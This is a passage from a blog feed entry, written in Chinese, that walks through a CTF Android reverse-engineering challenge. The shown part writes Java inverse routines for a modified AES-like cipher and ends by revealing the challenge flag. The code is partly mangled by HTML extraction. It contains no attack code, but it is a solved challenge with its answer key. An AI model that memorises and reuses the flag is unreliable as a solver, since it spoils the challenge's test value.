byteroundKey[]=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">for</span>(intj=<span class="number">0</span>;j&lt;<span class="number">16</span>;j++) &#123;</span><br><span class="line">    roundKey[j]=keyBytes[(<span class="number">10</span>-round)*<span class="number">16</span>+j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(round==<span class="number">0</span>)&#123;</span><br><span class="line">        state.addRoundKey(roundKey);</span><br><span class="line">    &#125; </span><br><span class="line">    elseif(round&lt;<span class="number">10</span>) &#123;</span><br><span class="line">        state.inverseShiftRows();</span><br><span class="line">        state.inverseSubstitute();</span><br><span class="line">        state.addRoundKey(roundKey);</span><br><span class="line">        state.inverseMixCloumns();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        state.inverseShiftRows();</span><br><span class="line">        state.inverseSubstitute();</span><br><span class="line">        state.addRoundKey(roundKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以问题转化为写出三个核心模块<code>shiftRows</code>，<code>mixCloumns</code>，<code>substitute</code>的逆算法<code>inverseShiftRows</code>，<code>inverseMixCloumns</code>，<code>inverseSubstitute</code></p><p>4.根据提示或者阅读<code>LightState</code>代码，<code>shiftRows</code>和AES完全一致，逆算法逻辑如下： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">publicvoid <span class="title">inverseShiftRows</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(inti=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">        bytetemp[]=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span>(intj=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++) &#123;</span><br><span class="line">            temp[j]=_statesi;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(intj=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++) &#123;</span><br><span class="line">            _statesi=temp[(<span class="number">4</span>+j-i)%<span class="number">4</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>substitute</code>也没有做改变，其逻辑为对_states4每一个byte，做一个变换得到输出sbox(byte)，因此逆算法在于写出<code>inverseSbox</code>方法，这里有三种路径获得： - 遍历sbox所有输入，得到所有输出，做成查找表即可</p><ul><li><p>直接查找AES的S盒逆查找表（如<a href="http://www.blogfshare.com/aes-rijndael.html" class="uri" target="_blank" rel="noopener">http://www.blogfshare.com/aes-rijndael.html</a>）</p></li><li><p><code>LightState</code>中有<code>inverseSbox</code>方法，可直接调用，最终写法为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">publicvoid <span class="title">inverseSubstitute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(intj=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++) &#123;</span><br><span class="line">            *statesi=inverseSbox(*statesi);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>5.<code>mixCloumns</code>做了改变，变化在于计算用于求模的多项式从<code>x8+x4+x3+x+1</code>变<code>x8+x4+x3+x^2+1</code>，但是逻辑没有改变，因此，正向逻辑为每一列左乘矩阵： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span></span><br><span class="line"><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span></span><br><span class="line"><span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure></p><p>6.逆算法同样为左乘逆矩阵(矩阵值可以网上查到)： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e,b,d,<span class="number">9</span></span><br><span class="line"><span class="number">9</span>,e,b,d</span><br><span class="line">d,<span class="number">9</span>,e,b</span><br><span class="line">b,d,<span class="number">9</span>,e</span><br></pre></td></tr></table></figure></p><p>7.所以需要写出修改后的乘法算法，在<code>LightState</code>中给出了没有改动多项式的乘法算法<code>multiply(inta, int b)</code>作为参考，可以仿照其样子写，需要改写的是两个多项式乘积后模原来的多项式这部分逻辑改成模新的多项式，逻辑如下： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">publicstatic <span class="keyword">byte</span> <span class="title">multiply_new</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        a+=<span class="number">256</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(b&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    b+=<span class="number">256</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    intvalues[]=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">8</span>];</span><br><span class="line">    inttemp=a;</span><br><span class="line">    <span class="keyword">for</span>(inti=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++) &#123;</span><br><span class="line">        values[i]=temp%<span class="number">2</span>;</span><br><span class="line">        temp/=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    intresults[]=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">11</span>];</span><br><span class="line">    <span class="keyword">if</span>((b&amp;<span class="number">0x08</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(inti=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(values[i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                results[i+<span class="number">3</span>]=(results[i+<span class="number">3</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((b&amp;<span class="number">0x04</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(inti=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(values[i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                results[i+<span class="number">2</span>]=(results[i+<span class="number">2</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((b&amp;<span class="number">0x02</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(inti=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(values[i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">              results[i+<span class="number">1</span>]=(results[i+<span class="number">1</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((b&amp;<span class="number">0x01</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(inti=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(values[i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                results[i]=(results[i]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(results[<span class="number">10</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    results[<span class="number">6</span>]=(results[<span class="number">6</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">    results[<span class="number">5</span>]=(results[<span class="number">5</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">    results[<span class="number">4</span>]=(results[<span class="number">4</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">    results[<span class="number">2</span>]=(results[<span class="number">2</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(results[<span class="number">9</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    results[<span class="number">5</span>]=(results[<span class="number">5</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">    results[<span class="number">4</span>]=(results[<span class="number">4</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">    results[<span class="number">3</span>]=(results[<span class="number">3</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">    results[<span class="number">1</span>]=(results[<span class="number">1</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(results[<span class="number">8</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    results[<span class="number">4</span>]=(results[<span class="number">4</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">    results[<span class="number">3</span>]=(results[<span class="number">3</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">    results[<span class="number">2</span>]=(results[<span class="number">2</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">    results[<span class="number">0</span>]=(results[<span class="number">0</span>]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>(<span class="keyword">byte</span>) (results[<span class="number">7</span>]*<span class="number">128</span>+results[<span class="number">6</span>]*<span class="number">64</span>+results[<span class="number">5</span>]*<span class="number">32</span>+results[<span class="number">4</span>]*<span class="number">16</span>+results[<span class="number">3</span>]*<span class="number">8</span>+results[<span class="number">2</span>]*<span class="number">4</span>+results[<span class="number">1</span>]*<span class="number">2</span>+results[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>主要修改在最后三个if，即模新的多项式。</p><p>8.所以列混淆的逆算法可以写为：</p><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">publicvoid <span class="title">inverseMixCloumns</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(intj=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++) &#123;</span><br><span class="line">        bytetemp[]=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">            temp[i]=_statesi;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _states0=add(multiply_new(temp[<span class="number">0</span>],<span class="number">0xe</span>), multiply_new(temp[<span class="number">1</span>], <span class="number">0xb</span>), multiply_new(temp[<span class="number">2</span>], <span class="number">0xd</span>),multiply_new(temp[<span class="number">3</span>], <span class="number">0x9</span>));</span><br><span class="line"></span><br><span class="line">        _states1=add(multiply_new(temp[<span class="number">0</span>],<span class="number">0x9</span>), multiply_new(temp[<span class="number">1</span>], <span class="number">0xe</span>), multiply_new(temp[<span class="number">2</span>], <span class="number">0xb</span>),multiply_new(temp[<span class="number">3</span>], <span class="number">0xd</span>));</span><br><span class="line"></span><br><span class="line">        _states2=add(multiply_new(temp[<span class="number">0</span>],<span class="number">0xd</span>), multiply_new(temp[<span class="number">1</span>], <span class="number">0x9</span>), multiply_new(temp[<span class="number">2</span>], <span class="number">0xe</span>),multiply_new(temp[<span class="number">3</span>], <span class="number">0xb</span>));</span><br><span class="line"></span><br><span class="line">        _states3=add(multiply_new(temp[<span class="number">0</span>],<span class="number">0xb</span>), multiply_new(temp[<span class="number">1</span>], <span class="number">0xd</span>), multiply_new(temp[<span class="number">2</span>], <span class="number">0x9</span>),multiply_new(temp[<span class="number">3</span>], <span class="number">0xe</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>9.至此三个逆算法完成，即可获得逆算法，最终flag为： <code>flag{aes_is_the_best_encryption}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/killshadow/CTFTopic/tree/master/reverse/Android/GAESAndroid&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;源码&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;一脱壳&quot;&gt;一、脱壳&lt;/h3&gt;
&lt;p&gt;1.使用jeb打开下载的apk文件，发现代码十分混乱，很明显是加固混淆过的代码，所以需要先将其脱壳。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Mobile Security" scheme="http://www.killshadow.xyz/tags/Mobile-Security/"/>
    
      <category term="Reverse" scheme="http://www.killshadow.xyz/tags/Reverse/"/>
    
      <category term="CTF" scheme="http://www.killshadow.xyz/tags/CTF/"/>
    
  </entry>
  
</feed>
